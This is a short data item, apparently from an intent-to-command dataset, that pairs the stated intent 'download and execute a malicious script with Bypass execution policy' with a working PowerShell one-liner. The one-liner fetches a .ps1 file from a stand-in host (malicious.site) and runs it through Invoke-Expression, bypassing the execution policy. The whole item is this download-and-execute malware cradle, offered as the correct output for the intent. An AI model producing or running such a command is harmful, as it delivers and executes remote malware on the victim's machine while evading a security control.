# Natural language intent:
# Download and execute a malicious script with Bypass execution policy in PowerShell.

powershell.exe -ExecutionPolicy Bypass -C "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://malicious.site/malware/kernFl.ps1')"
